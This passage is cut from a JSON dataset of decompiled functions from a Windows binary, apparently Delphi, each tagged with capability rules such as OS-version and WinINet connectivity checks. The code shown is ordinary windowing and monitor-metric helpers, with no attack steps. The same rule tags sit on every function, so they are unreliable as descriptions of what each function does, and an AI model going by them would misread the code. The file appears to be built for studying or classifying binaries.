            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042db76)\n// WARNING: Removing unreachable block (ram,0x0042dba1)\n// WARNING: Removing unreachable block (ram,0x0042dba4)\n// WARNING: Removing unreachable block (ram,0x0042dbe4)\n// WARNING: Removing unreachable block (ram,0x0042dc00)\n// WARNING: Removing unreachable block (ram,0x0042dc04)\n// WARNING: Removing unreachable block (ram,0x0042dc4a)\n// WARNING: Removing unreachable block (ram,0x0042dc13)\n// WARNING: Removing unreachable block (ram,0x0042dc57)\n\nvoid __fastcall fcn.0042da58(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    uStack76 = 0x42dcd1;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1ch = 0;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00405584();\n        puVar1 = puStack72;\n    }\n    puStack72 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040dba8();\n        fcn.00404ec4();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.00419888();\n            fcn.00407024();\n            fcn.00407050();\n            cVar2 = (**(_pe_dos_header + 0x38))();\n            if (cVar2 != '\\0') {\n                var_1ch = var_1ch + 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if (var_1ch == 0) {\n        fcn.0040dba8();\n        fcn.00404ec4();\n    }\n    if (var_1ch == 1) {\n        fcn.0042d9c4(&stack0xfffffffc);\n    }\n    else if (*(in_EAX + 0xc) == 0) {\n        fcn.0042d9c4(&stack0xfffffffc);\n    }\n    else {\n        fcn.00407050();\n        fcn.0042d9c4(&stack0xfffffffc);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x42dcd8;\n    uStack76 = 0x42dca5;\n    fcn.0040700c();\n    uStack76 = 0x42dcad;\n    fcn.00405530();\n    uStack76 = 0x42dcc0;\n    fcn.004060f8();\n    uStack76 = 0x42dcc8;\n    fcn.0040700c();\n    uStack76 = 0x42dcd0;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 831
    },
    "0042dd08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042dd08(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42ddc7;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00405584();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    if (*(*(in_EAX + 0x14) + 8) == 0) {\n        fcn.0040dba8();\n        fcn.00404ec4();\n    }\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            fcn.00419888();\n            fcn.00407024();\n            fcn.00407050();\n            cVar2 = (**(_pe_dos_header + 0x30))();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x34))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42ddce;\n    uStack36 = 0x42ddbe;\n    fcn.0040700c();\n    uStack36 = 0x42ddc6;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 429
    },
    "0042de34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042de34(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42de4d;\n    fcn.004059cc();\n    uStack28 = 0x42dede;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puStack24 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    iVar1 = arg_ch;\n    if (iVar1 == 1) {\n        fcn.0042da58();\n    }\n    else if (iVar1 == 2) {\n        fcn.0042d4c0();\n    }\n    else if (iVar1 == 3) {\n        fcn.0042d4f0();\n    }\n    else if (iVar1 == 8) {\n        fcn.0042da58();\n    }\n    else {\n        fcn.0042d654(arg_8h, arg_ch);\n        in_stack_ffffffd8 = arg_8h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x42dee5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 348
    },
    "0042d264": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d264(void)\n\n{\n    if (*0x497a74 == 0) {\n        fcn.0042d314();\n        fcn.00407024();\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "0042d290": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0042d290(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = 0;\n    }\n    fcn.0042d264();\n    uVar1 = fcn.00407050();\n    return uVar1 & 0xffffff00 | *in_EAX != 0;\n}\n",
        "token_count": 94
    },
    "0042d4f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d4f0(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42d645;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x42d51d;\n    piVar3 = fcn.00404620();\n    uStack52 = 0x42d5fa;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(in_EAX + 0x10) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            iVar4 = fcn.00419888();\n            cVar2 = (**(**(iVar4 + 4) + 0x18))();\n            if (cVar2 != '\\0') {\n                (**(**(iVar4 + 4) + 0xc))();\n                (**(*piVar3 + 0x3c))();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    iVar5 = (**(*piVar3 + 0x14))();\n    if (iVar5 == 1) {\n        iVar5 = (**(*piVar3 + 0x18))();\n        (**(**(iVar5 + 4) + 0x1c))();\n    }\n    else {\n        iVar5 = (**(*piVar3 + 0x14))();\n        if ((0 < iVar5) && (*(in_EAX + 0xc) != 0)) {\n            (**(*piVar3 + 0x90))();\n            (**(**(in_EAX + 0xc) + 0x10))();\n            (**(*piVar3 + 0x18))();\n            fcn.00407024();\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x42d601;\n    uStack52 = 0x42d5f9;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 624
    },
    "0042d654": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d654(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42d6f8;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        fcn.00405584();\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    iVar4 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.00419888();\n            fcn.0040700c(*(iVar3 + 4));\n            cVar2 = fcn.0040f944();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x40))(arg_8h, arg_ch);\n                break;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x42d6ff;\n    uStack40 = 0x42d6f7;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 391
    },
    "0042e0f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042e0f4(void)\n\n{\n    uint8_t in_AL;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42e10a;\n    fcn.004059cc();\n    uStack28 = 0x42e1b1;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_AL + 0x497aa0) == '\\0') {\n        if (*0x497a9c == 0) {\n            iVar2 = 0;\n            puStack24 = &stack0xfffffffc;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            if (((in_AL == 0) && (puStack24 = &stack0xfffffffc,  *0x497aa8 == '\\0')) &&\n               (puStack24 = &stack0xfffffffc,  *0x497a88 = fcn.0042e0f4(),  *0x497aa8 == '\\0')) {\n                fcn.00405530();\n            }\n            uVar1 = fcn.004059dc();\n            in_stack_ffffffd8 = *0x497a9c;\n            iVar2 = sub.kernel32.dll_GetProcAddress_1(*0x497a9c, uVar1);\n        }\n        if ((iVar2 != 0) && (in_AL != 0)) {\n            *0x497aa8 = '\\x01';\n        }\n        *(in_AL + 0x497aa0) = 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    iStack32 = 0x42e1b8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 446
    },
    "0042e1d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e1d8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x497aa0 == '\\0') {\n        *0x497a78 = fcn.0042e0f4();\n        (**0x497a78)(arg_8h);\n    }\n    else {\n        iVar1 = -1;\n        if (arg_8h - 0x4cU < 2) {\n            iVar1 = 0;\n        }\n        else if (arg_8h == 0x4e) {\n            arg_8h = 0;\n        }\n        else if (arg_8h == 0x4f) {\n            arg_8h = 1;\n        }\n        else if (arg_8h - 0x50U < 2) {\n            iVar1 = 1;\n        }\n        if (iVar1 == -1) {\n            sub.user32.dll_GetSystemMetrics(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "0042e260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e260(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x497aa2 == '\\0') {\n        *0x497a80 = fcn.0042e0f4();\n        uVar1 = (**0x497a80)(arg_8h, arg_ch);\n        return uVar1;\n    }\n    if ((arg_ch & 3) == 0) {\n        if (arg_8h[2] < 1) {\n            return 0;\n        }\n        if (arg_8h[3] < 1) {\n            return 0;\n        }\n        iVar2 = (**0x497a78)(0);\n        if (iVar2 <= *arg_8h) {\n            return 0;\n        }\n        iVar2 = (**0x497a78)(1);\n        if (iVar2 <= arg_8h[1]) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 237
    },
    "0042e2f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e2f0(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_10h;\n    \n    if (*0x497aa1 == '\\0') {\n        *0x497a7c = fcn.0042e0f4();\n        uVar1 = (**0x497a7c)(arg_8h, arg_ch);\n    }\n    else if ((arg_ch & 3) == 0) {\n        iVar2 = sub.user32.dll_IsIconic(arg_8h);\n        if (iVar2 == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n        }\n        else {\n            sub.user32.dll_GetWindowPlacement(arg_8h, &var_2ch);\n        }\n        uVar1 = fcn.0042e260(&var_10h, arg_ch);\n    }\n    else {\n        uVar1 = 0x12340042;\n    }\n    return uVar1;\n}\n",
        "token_count": 242
    },
    "0042e388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e388(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x497aa3 == '\\0') {\n        *0x497a84 = fcn.0042e0f4();\n        uVar1 = (**0x497a84)(arg_8h, arg_ch, arg_10h);\n        return uVar1;\n    }\n    if ((arg_10h & 3) == 0) {\n        if (arg_8h < 0) {\n            return 0;\n        }\n        iVar2 = (**0x497a78)(0);\n        if (iVar2 <= arg_8h) {\n            return 0;\n        }\n        if (arg_ch < 0) {\n            return 0;\n        }\n        iVar2 = (**0x497a78)(1);\n        if (iVar2 <= arg_ch) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 238
    },
    "0042e420": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e420(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x497aa4 == '\\0') {\n        *0x497a88 = fcn.0042e0f4();\n        uVar1 = (**0x497a88)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x497a78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x497a78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e4ec);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 400
    },
    "0042e4f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e4f4(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x497aa5 == '\\0') {\n        *0x497a8c = fcn.0042e0f4();\n        uVar1 = (**0x497a8c)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x497a78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x497a78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e5c0);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 405
    },
    "0042e5c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e5c8(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x497aa6 == '\\0') {\n        *0x497a90 = fcn.0042e0f4();\n        uVar1 = (**0x497a90)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x497a78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x497a78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e694);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 401
    },
    "0042e69c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e69c(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x497aa7 == '\\0') {\n        *0x497a94 = fcn.0042e0f4();\n        uVar1 = (**0x497a94)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = 0;\n        if (arg_10h != NULL) {\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = (**0x497a78)(0);\n            var_10h = (**0x497a78)(1);\n            if (arg_8h == 0) {\n                if ((arg_ch != 0) && (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    return 1;\n                }\n            }\n            else {\n                var_ch = sub.gdi32.dll_GetClipBox(arg_8h, &var_2ch);\n                iVar2 = sub.gdi32.dll_GetDCOrgEx(arg_8h, &var_8h);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                sub.user32.dll_OffsetRect(&var_1ch, -var_8h, -var_4h);\n                iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, &var_2ch);\n                if (((iVar2 == 0) || (arg_ch != 0)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    if (var_ch != 1) {\n                        return 0;\n                    }\n                    return 1;\n                }\n            }\n            uVar1 = (*arg_10h)(0x12340042, arg_8h, &var_1ch, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 556
    },
    "0042e9fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042e9fc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00407688();\n    if (*(iVar1 + 0x10) != 0) {\n        iVar1 = fcn.00407688();\n        iVar1 = sub.user32.dll_IsWindow(*(iVar1 + 0x10));\n        if (iVar1 != 0) goto code_r0x0042ea93;\n    }\n    do {\n        uVar2 = sub.user32.dll_FindWindowExA();\n        iVar1 = fcn.00407688();\n        *(iVar1 + 0x10) = uVar2;\n        fcn.00407688();\n        iVar1 = fcn.00407688();\n        if (*(iVar1 + 0x10) == 0) break;\n        iVar1 = fcn.00407688(0);\n        iVar1 = sub.user32.dll_GetWindowThreadProcessId(*(iVar1 + 0x10));\n        iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    } while (iVar1 != iVar3);\ncode_r0x0042ea93:\n    iVar1 = fcn.00407688();\n    return *(iVar1 + 0x10);\n}\n",
        "token_count": 282
    },
    "0042eba0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042eba0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x42ebd8);\n    if (iVar1 != 0) {\n        *0x497aac = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42ebe4);\n    }\n    if (*0x497aac == NULL) {\n        *0x497aac = fcn.0042eabc;\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0042ec00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ec00(uint arg_8h, uint arg_ch)\n\n{\n    if (*0x497aac == NULL) {\n        fcn.0042eba0();\n    }\n    (**0x497aac)();\n    return;\n}\n",
        "token_count": 55
    },
    "0042ec3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0042ec3c(uchar param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uchar extraout_CL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n        param_1 = extraout_CL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 187
    },
    "0042ee54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042ee54(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (*0x497b7c == NULL) {\n        uVar1 = 0;\n        if (*0x497b70 != 0) {\n            *0x497b7c = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42eecc);\n            if (*0x497b7c != NULL) {\n                uVar1 = (**0x497b7c)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b7c)();\n    }\n    return uVar1;\n}\n",
        "token_count": 158
    },
    "0042eee0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042eee0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497b80 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x497b70 != 0) {\n            *0x497b80 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42ef38);\n            if (*0x497b80 != NULL) {\n                uVar1 = (**0x497b80)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b80)();\n    }\n    return uVar1;\n}\n",
        "token_count": 140
    },
    "0042ef4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
